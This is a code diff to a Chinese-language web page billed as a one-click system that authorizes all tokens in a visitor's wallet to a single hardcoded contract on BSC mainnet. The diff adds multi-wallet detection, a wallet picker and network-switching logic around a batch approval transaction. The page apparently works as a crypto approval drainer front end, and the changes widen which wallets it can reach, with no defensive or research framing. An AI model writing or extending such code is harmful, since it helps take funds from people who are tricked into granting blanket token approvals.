@@ -130,6 +130,10 @@
             background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
         }
         
+        .btn.warning {
+            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
+        }
+        
         .status {
             margin-top: 20px;
             padding: 12px;
@@ -154,6 +158,12 @@
             background: #d1ecf1;
             color: #0c5460;
             border: 1px solid #bee5eb;
+        }
+        
+        .status.warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
         }
         
         .loading {
@@ -222,6 +232,59 @@
             color: #666;
             word-break: break-all;
         }
+        
+        .wallet-selector {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            margin-bottom: 8px;
+            background: white;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .wallet-option:hover {
+            background: #f8f9fa;
+        }
+        
+        .wallet-option:last-child {
+            margin-bottom: 0;
+        }
+        
+        .wallet-icon {
+            margin-right: 12px;
+            font-size: 20px;
+        }
+        
+        .wallet-name {
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .wallet-status {
+            margin-left: auto;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .network-info {
+            background: #e8f5e8;
+            border: 1px solid #c8e6c9;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
@@ -230,8 +293,18 @@
         <h1>自动代币授权系统</h1>
         <p class="subtitle">一键授权钱包中的所有代币</p>
         
+        <!-- 钱包选择器 -->
+        <div class="wallet-selector" id="walletSelector">
+            <h4>选择钱包:</h4>
+            <div id="walletOptions"></div>
+        </div>
+        
         <div class="wallet-info" id="walletInfo" style="display: none;">
             <strong>钱包地址:</strong> <span id="walletAddress"></span>
+        </div>
+        
+        <div class="network-info" id="networkInfo" style="display: none;">
+            <strong>当前网络:</strong> <span id="currentNetwork"></span>
         </div>
         
         <div class="contract-info">
@@ -240,13 +313,13 @@
                 <span class="value">0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7</span>
             </div>
             <div class="info-item">
-                <span class="label">网络:</span>
+                <span class="label">目标网络:</span>
                 <span class="value">BSC 主网</span>
             </div>
         </div>
         
-        <button class="btn" id="connectBtn" onclick="connectWallet()">
-            连接钱包
+        <button class="btn" id="connectBtn" onclick="selectWallet()">
+            选择并连接钱包
         </button>
         
         <button class="btn info" id="detectBtn" onclick="detectAndAuthorizeTokens()" style="display: none;">
@@ -255,6 +328,10 @@
         
         <button class="btn info" id="checkBtn" onclick="checkAuthorizationStatus()" style="display: none;">
             查询授权状态
+        </button>
+        
+        <button class="btn warning" id="switchNetworkBtn" onclick="switchToBSC()" style="display: none;">
+            切换到BSC网络
         </button>
         
         <!-- 进度条 -->
@@ -298,23 +375,90 @@
         
         let web3;
         let userAccount;
+        let currentWallet = null;
+        let currentChainId = null;
         
-        // 页面加载完成后自动连接钱包
+        // 页面加载完成后初始化
         window.addEventListener('load', async () => {
-            await connectWallet();
+            await initializeWalletSelector();
         });
         
-        // 连接钱包
-        async function connectWallet() {
-            try {
-                showStatus('正在连接钱包...', 'info');
+        // 初始化钱包选择器
+        async function initializeWalletSelector() {
+            const walletOptions = document.getElementById('walletOptions');
+            walletOptions.innerHTML = '';
+            
+            const availableWallets = [];
+            
+            // 检测MetaMask
+            if (window.ethereum) {
+                availableWallets.push({
+                    name: 'MetaMask',
+                    icon: '🦊',
+                    provider: window.ethereum,
+                    type: 'ethereum'
+                });
+            }
+            
+            // 检测TronLink
+            if (window.tronWeb) {
+                availableWallets.push({
+                    name: 'TronLink',
+                    icon: '🔗',
+                    provider: window.tronWeb,
+                    type: 'tron'
+                });
+            }
+            
+            // 检测其他钱包
+            if (window.BinanceChain) {
+                availableWallets.push({
+                    name: 'Binance Wallet',
+                    icon: '🏦',
+                    provider: window.BinanceChain,
+                    type: 'ethereum'
+                });
+            }
+            
+            if (availableWallets.length === 0) {
+                showStatus('未检测到任何钱包扩展，请安装MetaMask', 'error');
+                return;
+            }
+            
+            // 显示钱包选项
+            availableWallets.forEach((wallet, index) => {
+                const walletOption = document.createElement('div');
+                walletOption.className = 'wallet-option';
+                walletOption.onclick = () => connectWallet(wallet);
                 
-                if (typeof window.ethereum === 'undefined') {
-                    showStatus('请安装MetaMask钱包', 'error');
+                walletOption.innerHTML = `
+                    <span class="wallet-icon">${wallet.icon}</span>
+                    <span class="wallet-name">${wallet.name}</span>
+                    <span class="wallet-status">点击连接</span>
+                `;
+                
+                walletOptions.appendChild(walletOption);
+            });
+            
+            // 如果只有一个钱包，自动连接
+            if (availableWallets.length === 1) {
+                await connectWallet(availableWallets[0]);
+            }
+        }
+        
+        // 连接指定钱包
+        async function connectWallet(wallet) {
+            try {
+                currentWallet = wallet;
+                showStatus(`正在连接${wallet.name}...`, 'info');
+                
+                if (wallet.type === 'tron') {
+                    showStatus('TronLink不支持BSC网络，请使用MetaMask或其他支持BSC的钱包', 'warning');
                     return false;
                 }
                 
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                // 连接以太坊钱包
+                const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
                 if (accounts.length === 0) {
                     showStatus('请授权连接钱包', 'error');
                     return false;
@@ -322,62 +466,130 @@
                 
                 userAccount = accounts[0];
                 
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                // 检查网络
+                const chainId = await wallet.provider.request({ method: 'eth_chainId' });
+                currentChainId = chainId;
+                
                 if (chainId !== BSC_CHAIN_ID) {
-                    await switchToBSC();
+                    showStatus('当前不是BSC网络，请切换到BSC网络', 'warning');
+                    document.getElementById('switchNetworkBtn').style.display = 'block';
+                    document.getElementById('currentNetwork').textContent = getNetworkName(chainId);
+                    document.getElementById('networkInfo').style.display = 'block';
+                } else {
+                    showStatus('网络连接正常', 'success');
+                    document.getElementById('switchNetworkBtn').style.display = 'none';
+                    document.getElementById('networkInfo').style.display = 'none';
                 }
                 
-                web3 = new Web3(window.ethereum);
+                web3 = new Web3(wallet.provider);
                 
+                // 更新UI
                 document.getElementById('walletAddress').textContent = userAccount;
                 document.getElementById('walletInfo').style.display = 'block';
+                document.getElementById('walletSelector').style.display = 'none';
                 document.getElementById('detectBtn').style.display = 'block';
                 document.getElementById('checkBtn').style.display = 'block';
                 document.getElementById('connectBtn').style.display = 'none';
                 
-                showStatus('钱包连接成功！', 'success');
+                showStatus(`${wallet.name}连接成功！`, 'success');
                 setTimeout(() => hideStatus(), 2000);
                 
                 return true;
                 
             } catch (error) {
                 console.error('连接钱包失败:', error);
-                showStatus('连接钱包失败: ' + error.message, 'error');
+                showStatus(`连接${wallet.name}失败: ` + error.message, 'error');
                 return false;
             }
         }
         
+        // 选择钱包
+        async function selectWallet() {
+            document.getElementById('walletSelector').style.display = 'block';
+            document.getElementById('detectBtn').style.display = 'none';
+            document.getElementById('checkBtn').style.display = 'none';
+            document.getElementById('walletInfo').style.display = 'none';
+            document.getElementById('networkInfo').style.display = 'none';
+            document.getElementById('connectBtn').style.display = 'none';
+        }
+        
         // 切换到BSC网络
         async function switchToBSC() {
+            if (!currentWallet || currentWallet.type === 'tron') {
+                showStatus('无法切换网络', 'error');
+                return;
+            }
+            
             try {
-                await window.ethereum.request({
+                showStatus('正在切换到BSC网络...', 'info');
+                
+                await currentWallet.provider.request({
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: BSC_CHAIN_ID }],
                 });
+                
+                currentChainId = BSC_CHAIN_ID;
+                document.getElementById('switchNetworkBtn').style.display = 'none';
+                document.getElementById('networkInfo').style.display = 'none';
+                
+                showStatus('已切换到BSC网络', 'success');
+                
             } catch (switchError) {
                 if (switchError.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_CHAIN_ID,
-                            chainName: 'Binance Smart Chain',
-                            nativeCurrency: {
-                                name: 'BNB',
-                                symbol: 'BNB',
-                                decimals: 18
-                            },
-                            rpcUrls: [BSC_RPC_URL],
-                            blockExplorerUrls: ['https://bscscan.com/']
-                        }]
-                    });
+                    try {
+                        await currentWallet.provider.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID,
+                                chainName: 'Binance Smart Chain',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: [BSC_RPC_URL],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }]
+                        });
+                        
+                        currentChainId = BSC_CHAIN_ID;
+                        document.getElementById('switchNetworkBtn').style.display = 'none';
+                        document.getElementById('networkInfo').style.display = 'none';
+                        
+                        showStatus('已添加并切换到BSC网络', 'success');
+                        
+                    } catch (addError) {
+                        showStatus('添加BSC网络失败: ' + addError.message, 'error');
+                    }
+                } else {
+                    showStatus('切换网络失败: ' + switchError.message, 'error');
                 }
             }
+        }
+        
+        // 获取网络名称
+        function getNetworkName(chainId) {
+            const networks = {
+                '0x1': 'Ethereum 主网',
+                '0x38': 'BSC 主网',
+                '0x61': 'BSC 测试网',
+                '0x89': 'Polygon 主网',
+                '0x137': 'Polygon 主网',
+                '0xa': 'Optimism 主网',
+                '0xa4b1': 'Arbitrum 主网'
+            };
+            return networks[chainId] || `未知网络 (${chainId})`;
         }
         
         // 检测并授权代币
         async function detectAndAuthorizeTokens() {
             if (!web3 || !userAccount) {
                 showStatus('请先连接钱包', 'error');
+                return;
+            }
+            
+            if (currentChainId !== BSC_CHAIN_ID) {
+                showStatus('请先切换到BSC网络', 'error');
                 return;
             }
             
@@ -416,7 +628,7 @@
                     gasPrice: await web3.eth.getGasPrice()
                 };
                 
-                showStatus('请在MetaMask中确认批量授权交易...', 'info');
+                showStatus('请在钱包中确认批量授权交易...', 'info');
                 
                 const receipt = await web3.eth.sendTransaction(transaction);
                 
@@ -437,7 +649,7 @@
                 
                 const detectBtn = document.getElementById('detectBtn');
                 detectBtn.disabled = false;
-                detectBtn.innerHTML = '重新授权';
+                detectBtn.innerHTML = '重新检测';
             }
         }
         
@@ -561,28 +773,35 @@
         // 监听网络切换
         if (window.ethereum) {
             window.ethereum.on('chainChanged', (chainId) => {
+                currentChainId = chainId;
                 if (chainId !== BSC_CHAIN_ID) {
-                    showStatus('请切换到BSC网络', 'error');
+                    showStatus('网络已切换，请确保使用BSC网络', 'warning');
+                    document.getElementById('switchNetworkBtn').style.display = 'block';
+                    document.getElementById('currentNetwork').textContent = getNetworkName(chainId);
+                    document.getElementById('networkInfo').style.display = 'block';
                 } else {
-                    hideStatus();
+                    showStatus('已切换到BSC网络', 'success');
+                    document.getElementById('switchNetworkBtn').style.display = 'none';
+                    document.getElementById('networkInfo').style.display = 'none';
                 }
             });
             
             window.ethereum.on('accountsChanged', (accounts) => {
                 if (accounts.length === 0) {
                     userAccount = null;
+                    currentWallet = null;
                     document.getElementById('walletInfo').style.display = 'none';
+                    document.getElementById('networkInfo').style.display = 'none';
                     document.getElementById('detectBtn').style.display = 'none';
                     document.getElementById('checkBtn').style.display = 'none';
+                    document.getElementById('switchNetworkBtn').style.display = 'none';
+                    document.getElementById('walletSelector').style.display = 'block';
                     document.getElementById('connectBtn').style.display = 'block';
                     showStatus('钱包已断开连接', 'error');
                 } else {
                     userAccount = accounts[0];
                     document.getElementById('walletAddress').textContent = userAccount;
                     document.getElementById('walletInfo').style.display = 'block';
-                    document.getElementById('detectBtn').style.display = 'block';
-                    document.getElementById('checkBtn').style.display = 'block';
-                    document.getElementById('connectBtn').style.display = 'none';
                     hideStatus();
                 }
             });
